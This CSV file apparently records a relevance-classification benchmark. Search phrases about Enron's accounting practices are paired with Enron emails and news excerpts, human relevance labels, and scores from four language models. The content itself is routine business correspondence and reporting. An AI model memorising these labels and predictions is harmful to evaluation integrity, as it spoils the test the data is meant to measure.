search_phrase,label,email,mistral_pred,openhermes_pred,vicuna_pred,gemma_pred
RANDOM,0,"Subject: Re: 3/14

550480- 
Kate I just called Prebon and they said they made a mistake the cp should be 
Morgan not Merrill........





   Kate Symes @ ECT                03/20/2001 01:27 PM


Subject: Re: 3/14  

550480 has been changed to Merrill per Sean Crandall

550383 and 550385 - I'm still waiting to hear from Mike Driscoll on these - 
I'll let you know.

Thanks,
Kate



Evelyn Metoyer@ENRON
03/20/2001 10:53 AM

Subject: 3/14


Hi Kate, Stephanie Checkout with Prebon because I was out last week and I am 
still trying to clear up some deals from the 14th.   The west checkout person 
at Prebon is on vacation and his back-up is just now getting back with me on 
these discrepancies.

Matt Motley
deal 550383
Prebon says cp should be Neveda Power.,..........we have Sierra Pacific

Matt Motley
deal 550385
Prebon says cp should be Neveda Power.......we have Sierra Pacific


Sean Crandall
deal 550480
Prebon says cp should be Merrill Lynch......we have Morgan Stanley





",0.0,0.2,0.7,0.2
RANDOM,0,"Subject: RE: FDD Status for Dec 19th, 2001

Thanks!

Sue

 -----Original Message-----
Subject:	RE: FDD Status for Dec 19th, 2001

Yes. I have been monitoring BP's FDD balance. Sherry and Chris have been working with someone at BP, filling in for the regular vacationing BP scheduler, and who is unfamiliar with FDD service. Chris and Sherry have taken the over scheduled FDD and rescheduled it into BP's IDD account. Currently BP's FDD is within contract parameters and I will continue to monitor all FDD balances.

 -----Original Message-----
Subject:	FW: FDD Status for Dec 19th, 2001

	Are you up to speed on this?  We need to discuss.  Thanks. Lynn

 -----Original Message-----
Subject:	FW: FDD Status for Dec 19th, 2001

Lynn,

Can you please check into BP Canada injecting more than their FDD contract quantity.  What can be done now.  What processes do we need to put in place to prevent that from happening in the future?

Thanks,

Sue

 -----Original Message-----
Subject:	FDD Status for Dec 19th, 2001

Attached is the latest FDD status report as of December 19th.

Tabs showing FDD activity for this time period for the last three years is also included.


The GIP contracts should be at 89.90% to be on target to get to the max allowable contract quantity for the end of December.  The max target amount for GIP accounts by the end of December is 83.5%.  The average remaining balance for all GIP contracts is 95%.  To get to the tariff limit of 83.5% by Jan 1st, the GIP contracts will have to withdrawal about 1.8 Bcf, or 150 mmcfd, over the next 12 days.

The 3-step & 4-step do not have a minimum requirement to be met by the end of December since minimum withdrawals for Nov/Dec is zero.

The last report stated that Entergy-Koch had switched to GIP from 4-step.  This was in error.  They are still in the 4-step process.

BP Canada has injected 101.16% of their contract amount.  They have 2,125,406 of GIP on a contract of 2,100,932.

The percentage break out by service is GIP - 34.5%, 4-Step - 45.9%, and 3-Step - 19.5%.

Overall FDD is 94.36% full.

If you have any questions, please call me.

Steve Thomas
Gas Storage Manager
",0.0,0.0,0.8,0.0
mark to market losses,0,Subject: margin by commodity 11/20/01 Statement Frank F. Cernosek Exchange Accounting Financial Operations,0.0,0.0,0.7,0.8
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Subject: Enron MentionsEnron Seeks Cash Infusion Of $2 BillionThe Wall Street Journal, 11/06/01COMPANIES & FINANCE - INTERNATIONAL - Fitch lowers Enron rating.Financial Times, 11/06/01IN BRIEF / ENERGY Enron Debt Ratings Are Lowered by FitchLos Angeles Times, 11/06/01Fitch downgrades Enron's debt rating Houston Chronicle, 11/06/01Enron Seeks Investors to Raise $2 Billion in Cash, WSJ SaysBloomberg, 11/06/01Enron's German Shares Drop After WSJ Says It Seeks $2 BillionBloomberg, 11/06/01Reuters English News Service, 11/06/01Enron Seeks $2 Billion Cash Infusion as It Faces an Escalating Fiscal CrisisDow Jones Business News, 11/06/01Enron seeks 2 bln usd cash injection in exchange for equity stake - reportAFX News, 11/06/01Enron Long-Term Debt Rating May Be Cut to Junk Status by FitchBloomberg, 11/06/01 COMPANIES & FINANCE THE AMERICAS - Lower power prices aid PG&E Corp.Financial Times, 11/06/01ASIA-PACIFIC - Enron unit set to quit project.Financial Times, 11/06/01World Business Briefing Asia: India: Utility Transfer NoticeThe New York Times, 11/06/01Dabhol serves asset transfer notice on MSEBBusiness Standard, 11/06/01Enron to bring curtains down on India power projectAgence France-Presse, 11/06/01Enron unit DPC serves notice to close India power projectAFX News, 11/06/01Shell: Enron India Oil, Gas Assets Buy Talk ""Speculative""Dow Jones Energy Service, 11/06/01Enron Plans To Sell 50% Of S Korean JV With SK CorpDow Jones International News, 11/06/01Tractebel, Enron In 245 MW Mexican Cogeneration ProjectDow Jones International News, 11/06/01Seven Oil-Services, Drilling Firms Record 10% Share-Price Hit Last Week.The Oil Daily, 11/06/01Gas Prices Plunge on Weather Forecasts, Enron-Linked Market Maneuvers.The Oil Daily, 11/06/01Enron Credit Web Site Lists No Rating For Enron Corp.Dow Jones News Service, 11/05/01Enron Seeks Cash Infusion Of $2 BillionBy Wall Street Journal staff reporters Robin Sidel and Kara Scannell in New York and Rebecca Smith in Los Angeles11/06/2001The Wall Street JournalA3(Copyright (c) 2001, Dow Jones & Company, Inc.)",0.0,0.0,0.9,0.0
raptor creation of special purpose entities,0,"Subject: Raptor IV assignmentJoel: Carol will give you a call about this. Thanks.Sara ShackletonEnron North America Corp.1400 Smith Street, EB 3801aHouston, Texas 77002",0.0,0.0,0.5,0.0
it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"deal of blame. If nothing else, Lay allowed a culture of rule breaking to =flourish, and he obviously misled investors. Enron's adventures in creative= accounting are not a recent development. Back in mid-1995, Jim Alexander, =then CFO of Enron Global Power & Pipelines, walked into Lay's office to rep=ort concerns he had about Enron's numbers for overseas projects. ""I told hi=m I had heard there were manifold serious problems with the [accounting on]= international projects,"" Alexander recalls. Lay's reaction? Nothing.=20That wasn't the only warning. One of the most remarkable documents unearthe=d by Energy and Commerce researchers was an unsigned seven- page letter fro=m Enron vice president Sherron Watkins to Lay, written on Aug. 15, 2001. Th=e letter informed him, among other things, that Enron executives ""consisten=tly and constantly"" questioned the company's accounting methods to senior o=fficials, including former CEO Jeff Skilling. ""I am incredibly nervous that= we will implode in a wave of accounting scandals,"" she wrote. That was aro=und the same time Lay was telling Wall Street that there weren't any ""accou=nting issues, trading issues, or reserve issues"" at Enron. Two months later=, when Enron announced its quarterly financial results, Lay had this to say=g market position make us very confident in our strong earnings outlook.""==20In reality, of course, Enron was a bigger financial scandal than even the m=ost critical observers believed. Watkins' letter makes it clear that the pa=rtnerships and off-balance-sheet entities that Enron created weren't used j=ust to ""reduce risk,"" as the company claimed repeatedly last fall. They wer=e used to cook the books, plain and simple. ""That's just too bad, too fraud=ulent, surely AA&Co. wouldn't let them get away with that,"" wrote Watkins, =anticipating the reaction should outsiders begin to dig into the accounting=.=20If Arthur Andersen hadn't ""let them get away with it,"" what would Enron's e=arnings have looked like? How much of the $101 billion in revenues that Enr=on reported in 2000 were created via multiple transactions with entities th=at weren't independent third parties? And the partnerships are only part of= the story. The other issue is Enron's overly aggressive use of mark-to-mar=ket accounting. There's nothing wrong with this method of accounting, which= entails pricing securities at their fair value and running gains or losses= through the income statement. But in illiquid markets, like those for long=- term energy contracts, there's no benchmark of fair value. So Enron often= relied on internal models--which creates serious potential for abuse. And =because Skilling and Lay had established a culture in which earnings growth= was paramount, managers had plenty of incentive to push the limits.=20Enron's much-hyped North American trading operation, which at one point acc=",1.0,0.8,0.8,0.8
RANDOM,0,"Subject: Leaving for FL/ Annual Shipper Meeting/ Ava-35842


	Leaving for FL/ Annual Shipper Meeting/ Ava-35842


Chairperson:	Outlook Migration Team

Detailed Description:",0.0,0.0,0.0,0.0
RANDOM,0,"Subject: Amarillo Region Outage Report Through May 2002

Please review the attached outage report.

		 

Colleen Hood",0.0,0.0,0.0,0.0
RANDOM,0,"ent news headlines, 
Wall Street analysts' consensus opinions, and S&P's fair value for 
the stock. (5-page report for purchase - $5)


5. THIRD-PARTY REVIEW 
Wall Street Strategies makes the case for continued strength in stocks.

Principal analyst Charles Payne cites several reasons he sees investors driving 
the market higher. Also, he takes a technical look at major market indexes and 
rates stocks in the consumer sector, including Phillip Morris (MO). (19-page 
report for purchase - $150)


======================== Sponsored by ========================= 

The Telecomm Analyst: Wall Street's daily and weekly industry outlook 

Multex's The Telecomm Analyst features daily telecommunications-industry
specific research highlights, investment ideas, analyst opinions, portfolio 
strategies: http://www.multexinvestor.com/Analysts/HomeTTA.asp

To be sure you receive your TTA newsletter every week, click here:
==============================================================


Online advice and chats 
-----------------------------------------

1. ASK THE ANALYST 
Schaeffer's Research's Bernie Schaeffer discusses important technical market 
levels.

Schaeffer takes a look at recent market activity, keying on trendlines, possible 
points of resistance, as well as development of overly bullish sentiment. What 
critical technicals should you be looking at? Ask Bernie questions until Mon. 
Nov. 26.

Prepare for the investing week ahead with Bernie's insight to the hottest 
sectors and stocks. Sign up below for Bernie's FREE e-weekly market report, 
Monday Morning Outlook. Click here 


2. ASK THE EXPERT 
American Century Investment's Karen Burnett talks about choosing a retirement 
plan for your business. 

Choosing a retirement plan for your business or yourself is one of the most 
important financial decisions you will make. Karen Burnett of American Century 
Investments will take your questions until Thurs., November 29.


Free and sponsored reports 
-----------------------------------------

1. FREE RESEARCH REPORT 
Prudential looks at recent developments in computer and application software.

The analysts discuss the launch of Microsoft's (MSFT) Windows XP and XBox, 
Computer Associates (CA), Wind River Systems (WIND), Symantec (SYMC), Vignette 
(VIGN), and more. This 11-page report, which usually sells for $25, is free 
to members for the next 72 hours.


2. DAILY FREE SPONSOR REPORT 
Morgan Stanley sets a $28 price target on diversified technology company 
Agil",0.0,0.0,0.5,0.3
mark to market accounting practices,0,"Subject: ISDA PRESS REPORT FOR THURSDAY, NOVEMBER 30, 2000ISDA PRESS REPORT - THURSDAY, NOVEMBER 30, 2000* Firms Alter Derivatives Use As Rule Change Looms - The Wall StreetJournal Europe* OTC Derivatives Market Grows - Financial Times* D.C. Bar Panelists Call for Tax Law Review In Wake of FASB RuleChange on Derivatives - BNA, Inc.* Ops Execs See Raised Profile - Operations Management* UK Association Sets Up Think Tank - Operations ManagementFirms Alter Derivatives Use As Rule Change LoomsThe Wall Street Journal Europe - November 30, 2000By Joe NiedzielskiSome big U.S. corporations are altering their use of derivatives in therun-up to a new accounting rule that goes on the books next year, accordingto a survey of senior financial executives released by Solution133.com LLC.The basic findings of the survey of more than 100 senior executives atFortune 1000 companies confirm what some observers of the derivativesmarkets have been saying for several months: Corporations will stick withsimple, or plain vanilla, derivatives instruments because of the complexityand requirements of the new rule known as Financial Accounting Standard 133.In its broadest form, FAS 133, requires corporations to report on theirbalance sheets the fair market value of their holdings of derivatives andthat they be marked to market.Corporations have publicly voiced their concerns in recent years that thestandard may result in significant earnings volatility and hurt their shareprices. That concern remains among the top issues for those corporateexecutives surveyed by Solution133.com, an Internet-based resource ofinformation and tools that lets companies tackle the valuation, accountingand reporting requirements of the new rule. Solution133.com is a jointventure of PricewaterhouseCoopers and Gifford Fong Associates.""Hopefully, all companies that produce U.S.-based GAAP (Generally AcceptedAccounting Principles) financial statements are evaluating their use ofderivatives and hedges, especially understanding the impact on earningsvolatility that could occur as a result of FAS 133,"" said Stan Friedman,Solution133.com's chairman and chief executive officer.The new standard has also been viewed by many observers as a spotlight intothe risk-management profiles of U.S. corporations. That's because thestandard also requires corporations to describe their risk-managementstrategies and reasons for undertaking a particular hedge at its inception.The correlation, or effectiveness, of the derivative with the hedged itemmust also be tested.",0.0,0.0,0.0,0.2
RANDOM,0,"Subject: Finance Committee Minutes - August 12, 2001

Please provide comments to the attached minutes by September 11th. If you approve as written, please let us know. Regards, Rebecca

 

Kelly M. Johnson
Executive Assistant
Enron Corp.

CONFIDENTIALITY NOTICE

The information contained in this email may be confidential and/or privileged. This email is intended to be reviewed by the individual or organization named above. If you are not the intended recipient, you are hereby notified that any review, dissemination or copying of this email or its attachments, if any, or the information contained herein is prohibited. If you receive this email in error, please immediately notify the sender by return email and delete this email from your system. Thank you.
",0.0,0.0,0.7,0.0
RANDOM,0,"Subject: Fw: More Pictures!

---------------------- Forwarded by Mike Carson/Corp/Enron on 10/27/2000 


""Heather Hill"" <hhill@houston.rr.com> on 10/24/2000 08:22:17 AM

Subject: Fw: More Pictures!



----- Original Message -----
Subject: Fwd: More Pictures!


>
>
>
> >Date: Fri, 20 Oct 2000 18:28:30 GMT
> >
>
> _________________________________________________________________________
> Get Your Private, Free E-mail from MSN Hotmail at http://www.hotmail.com.
>
> Share information about yourself, create your own public profile at
>

 - Dcp00851.jpg
 - Dcp00859.jpg
 - Dcp00864.jpg",0.0,0.0,0.0,0.8
record keeping accounting practices,0,"Subject: RE: HPL Books and RecordsCarol, thanks.Anne: we need to send this list to AEP to ensure they agree that this is the extent of our ""Books and Records"" obligations at Close.Thanks,Brian -----Original Message-----Subject: HPL Books and Records Sally and Brian,Per my conversation with Brian regarding HPL books and records to be turned over to AEP, we will complete the identification and inventory report of records to be turned over by close of business Thursday, April 26, 2001. We will continue to track and monitor the location of these records during the transition of personnel from Enron to AEP. In order to ensure delivery of the HPL/AEP Records Transfer List, we have increased the resources from three to ten individuals.Please call me if you need further clarification or have any comments or concerns.Thank you,Carolyn GilleyExt. 35237",0.0,0.0,0.8,0.0
RANDOM,0," and consequently are unable to transact with the ISO or to enter 
deals in enpower.  This has also affected our connection to PX Trade App.  We 
are effectively prevented from taking advantage of market conditions in 
California.  Earlier I had started to initiate some congestion relief  on the 
Palo Verde tie .  Cong was $225 to $250 at Palo and I was confident I could 
take advantage by moving power out of SP.  I was unable to do anything in 
Caps as I was kicked out every few minutes.

I feel the communication process regarding this problem has been flawed.  I'm 
sure there is plenty of blame to go around .  I suggest we meet with IT  to 
define a process where we will get immediate attention and results.  

As of 3:20 we still have the same problems. 

I am hoping this problem is isolated to Sunday. 

",0.0,0.0,0.7,0.2
RANDOM,0,"penses up to this figure.
?
The  course is scheduled to run in Amsterdam (not London as originally 
planned) and  Houston. The dates are slightly flexible?to?work with your 
travel  schedules. For instance, would you prefer to travel to  
Sydney-Houston-Amsterdam-Sydney, or in the opposite  direction?
?
If  you could contact me to?let me know if this would?enable you to  commit 
to the course, I would be delighted to forward the notes from the  research. 
I would plan to then work on the outline until March  1st.I look forward to 
speaking with you  soon.
?
Best  wishes,
?
Paul  Bristow?
-----Original Message-----
Subject: Re: EPRM  conferences


Hi Paul,
?
Bit of a busy morning here - I'll be out for  about 1.5 hrs (9.15 Sydney 
time). If we don't catch up today, I'll call  tomorrow.
?
Chris.
?
----- Original Message ----- 
Subject: RE: EPRM conferences

Hi Chris,
?
I would like to confirm the dates of some of the  forthcoming EPRM events:
?
Effective VaR and stress testing  techniques for the US energy industry. This 
event will run on the  21 & 22 May in London and the 28 & 29 May in Houston. 
Michele Du  Berry (Director of Conferences) and I are looking at how we have  
structured the training courses and are keen to present a different  outline 
than on previous courses. I would like to run this event with 2-3  trainers 
per venue, rather than with 7-8 as we have done in the past. If  you and Les 
Clewlow would be interested in leading this course (possible  with Vince 
Kaminski) I would be delighted to discuss the event in greater  detail.
?
Energy & Power Risk Management,  Europe. Our largest annual European event is 
scheduled to between  September 19-21. Victoria Kerridge will be producing 
this event from the  London office and will be starting research in two 
weeks. I am going to be  providing her with a brief and will ensure that she 
has your contact  details.
?
I have also been finalizing the details for the  annual Energy & Power Risk 
Management event in Houston. This will take  place on May 14th & 15th and is 
close to completion. I would be happy  to provide you with more details, 
without potentially running the risk of  overloading your schedule with a 
number of events in a short space of time  (VaR and EPRM, Houston). My 
priority is to secure trainers for our VaR  course.
?
If you would be interested in any of the events  listed, I would be happy to 
talk with you this week. My direct line is 212  925 6990, extension 225. 
?
Best wi",0.0,0.0,0.7,0.0
raptor creation of special purpose entities,0,Subject: Master Netting Agreement AssignmentsAttached is the updated list.,0.0,0.0,0.0,0.0
